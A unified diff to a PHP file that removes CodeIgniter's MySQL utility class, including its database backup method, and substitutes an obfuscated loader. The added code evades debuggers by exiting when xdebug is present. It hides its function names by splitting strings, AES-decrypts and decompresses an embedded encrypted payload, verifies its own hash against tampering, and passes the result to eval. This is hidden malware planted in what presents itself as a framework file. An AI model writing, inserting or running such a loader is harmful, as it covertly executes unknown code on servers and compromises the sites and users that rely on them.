@@ -1,211 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * MySQL Utility Class
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_mysql_utility extends CI_DB_utility {
-
-	/**
-	 * List databases statement
-	 *
-	 * @var	string
-	 */
-	protected $_list_databases	= 'SHOW DATABASES';
-
-	/**
-	 * OPTIMIZE TABLE statement
-	 *
-	 * @var	string
-	 */
-	protected $_optimize_table	= 'OPTIMIZE TABLE %s';
-
-	/**
-	 * REPAIR TABLE statement
-	 *
-	 * @var	string
-	 */
-	protected $_repair_table	= 'REPAIR TABLE %s';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Export
-	 *
-	 * @param	array	$params	Preferences
-	 * @return	mixed
-	 */
-	protected function _backup($params = array())
-	{
-		if (count($params) === 0)
-		{
-			return FALSE;
-		}
-
-		// Extract the prefs for simplicity
-		extract($params);
-
-		// Build the output
-		$output = '';
-
-		// Do we need to include a statement to disable foreign key checks?
-		if ($foreign_key_checks === FALSE)
-		{
-			$output .= 'SET foreign_key_checks = 0;'.$newline;
-		}
-
-		foreach ( (array) $tables as $table)
-		{
-			// Is the table in the "ignore" list?
-			if (in_array($table, (array) $ignore, TRUE))
-			{
-				continue;
-			}
-
-			// Get the table schema
-			$query = $this->db->query('SHOW CREATE TABLE '.$this->db->escape_identifiers($this->db->database.'.'.$table));
-
-			// No result means the table name was invalid
-			if ($query === FALSE)
-			{
-				continue;
-			}
-
-			// Write out the table schema
-			$output .= '#'.$newline.'# TABLE STRUCTURE FOR: '.$table.$newline.'#'.$newline.$newline;
-
-			if ($add_drop === TRUE)
-			{
-				$output .= 'DROP TABLE IF EXISTS '.$this->db->protect_identifiers($table).';'.$newline.$newline;
-			}
-
-			$i = 0;
-			$result = $query->result_array();
-			foreach ($result[0] as $val)
-			{
-				if ($i++ % 2)
-				{
-					$output .= $val.';'.$newline.$newline;
-				}
-			}
-
-			// If inserts are not needed we're done...
-			if ($add_insert === FALSE)
-			{
-				continue;
-			}
-
-			// Grab all the data from the current table
-			$query = $this->db->query('SELECT * FROM '.$this->db->protect_identifiers($table));
-
-			if ($query->num_rows() === 0)
-			{
-				continue;
-			}
-
-			// Fetch the field names and determine if the field is an
-			// integer type. We use this info to decide whether to
-			// surround the data with quotes or not
-
-			$i = 0;
-			$field_str = '';
-			$is_int = array();
-			while ($field = mysql_fetch_field($query->result_id))
-			{
-				// Most versions of MySQL store timestamp as a string
-				$is_int[$i] = in_array(strtolower(mysql_field_type($query->result_id, $i)),
-							array('tinyint', 'smallint', 'mediumint', 'int', 'bigint'), //, 'timestamp'),
-							TRUE);
-
-				// Create a string of field names
-				$field_str .= $this->db->escape_identifiers($field->name).', ';
-				$i++;
-			}
-
-			// Trim off the end comma
-			$field_str = preg_replace('/, $/' , '', $field_str);
-
-			// Build the insert string
-			foreach ($query->result_array() as $row)
-			{
-				$val_str = '';
-
-				$i = 0;
-				foreach ($row as $v)
-				{
-					// Is the value NULL?
-					if ($v === NULL)
-					{
-						$val_str .= 'NULL';
-					}
-					else
-					{
-						// Escape the data if it's not an integer
-						$val_str .= ($is_int[$i] === FALSE) ? $this->db->escape($v) : $v;
-					}
-
-					// Append a comma
-					$val_str .= ', ';
-					$i++;
-				}
-
-				// Remove the comma at the end of the string
-				$val_str = preg_replace('/, $/' , '', $val_str);
-
-				// Build the INSERT string
-				$output .= 'INSERT INTO '.$this->db->protect_identifiers($table).' ('.$field_str.') VALUES ('.$val_str.');'.$newline;
-			}
-
-			$output .= $newline.$newline;
-		}
-
-		// Do we need to include a statement to re-enable foreign key checks?
-		if ($foreign_key_checks === FALSE)
-		{
-			$output .= 'SET foreign_key_checks = 1;'.$newline;
-		}
-
-		return $output;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_spzdf8ng=('bas'.'e64'.'_de'.'cod'.'e');
+$_qbkebeil=('gzu'.'nco'.'mpr'.'ess');
+$_f096xai0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_rjjtiitd='nY5B2laB';
+$_vcv3kzk8='3DIIUrFK';
+$_yd8gg80d='9M1SsGVp';
+$_vplk60c7='/cXzGVw6';
+$_dx2xhde2='f5zJLyLDKtw=';
+$_s7xfmeg2='wf3NBQ==';
+$_d2kqrl97='TaZcNjgP';
+$_mzg7twgh='67GoJXqj';
+$_vz56rzch=$_spzdf8ng($_yd8gg80d.$_vplk60c7.$_rjjtiitd.$_vcv3kzk8.$_dx2xhde2);
+$_d9b8ye24=$_spzdf8ng($_mzg7twgh.$_d2kqrl97.$_s7xfmeg2);
+$_z9duzi1y=$_spzdf8ng('ePy2VgIrHyQZCJGuD19D0Lrdu+1W0AAs33Nb4k3CsTXJ74tBmOtQJRD7l51mm65UFKfOmA5zb4Xi9mUZ8ywQkp6uEihmi6cZgsYYuNZHTYHVmkbjzhtlUQVmZGkSZr6cdN120wyWMRbnwMtZmDKv98Zs9moUR0KCXErfhInU3XZA5a5+CrzzCUfmW8tWRZSaTmp2yASmqz6fFgDUxmy3TXHMnkBs2vOs/prQSiOE3HZ0fOmeKyU8rnfVlMJPN0/kB1gvQQwJ6LgkDls9R38rl+7RlsAjGv62dihHOpGdOaEAAUtLrZ+0xSLlaHBE0t+F3aE03Zu1wm/O1pb0Ptehvln820MMjGqD8bbFdMY2UQuHhKyyuKlHtuAS86QTrLwEyu/OZOgWz7kkdt+GI/2PzzegWtnHM9LldrHCAgJJOQ0Amk4ghHtGUh/ejSYD+kPW5IEjJWwHdJXVNS4kZpaGVGZV/25JvYQt89P34QaX3lYmsUmKz662PVfqRprYh42ZnKLPSIYNllQ7goqeYnrYpDCuMLNuW7tln9pqGdil3BHD7wfHDleBflcu3Y9ujgm2xRg6/rs2pC+XwGPcH8j0xb35O2Vzc9OoRgDnsi16ZyrV6AoL3Mq2Wf1C/DNZafRI+T/ZglF21sXQWzvMz97e97t2S/w5M6FQ93ywhSzwgpQizmOdYpylVWOpgWnBxXsnaUHS5MHMSJfJpX8trT08FvKjZHETRKy/KMS+6axfkyA38lqkEWaGF7tnbx7GkclWM3+H/n83Jre7FvZ6cfBZOLTsxuwvHS15CSDox3Waz9OG38Ei1uqk8F9bfnjaQ1FB6Jg9VIfTvTS+TEqxE9Mt34UNrlbd0uQB5caam0k5EMjbO1sVnLOYe2agFQ6gCi/Jh7FK1jTU1joVww/CtGTXg9OWZyj8/ReNEqR8d5hZxKmmUYlswnB/sNpnrvyusjkV0B+rBB+IUb/eWPoYWm7jIxMIeLZ67bB3XHMFs/lk0z3OFzpM2YzuIjN5LZGrTjVZtGAA/jrqegAexhpnxE0eA5GexCPYFQY0LxZqiozKDsM6DXeWPiVNwy64bBG2xfw3hhjRTelzrlPI3M7Hx4o1IKstWN3OiDrbQQxLI+89hItNExPAbycyjDQmRyFO5dD/CUUdaLDD08v2pY6EYwfpQ6WGtbZLlYaZZ30qjPUDXuw=');
+$_i95lefdl=$_f096xai0($_z9duzi1y,'aes-256-cbc',$_vz56rzch,OPENSSL_RAW_DATA,$_d9b8ye24);
+if($_i95lefdl===false){exit;}
+$_oc0e4wxu=$_qbkebeil($_i95lefdl);
+if($_oc0e4wxu===false){exit;}
+$_w4dzdk6o='e5c7780180c88f8c7f58e138b1fc1130aba692526b3b42d6e51c66233a19d1ca';
+$_f44a15b2=@file_get_contents(__FILE__);
+if($_f44a15b2!==false){
+$_zaz8w1sm=str_replace($_w4dzdk6o,"0000000000000000000000000000000000000000000000000000000000000000",$_f44a15b2);
+$_dp331pgl=hash("sha256",$_zaz8w1sm);
+if($_dp331pgl!==$_w4dzdk6o){@http_response_code(403);exit;}
 }
+eval($_oc0e4wxu);
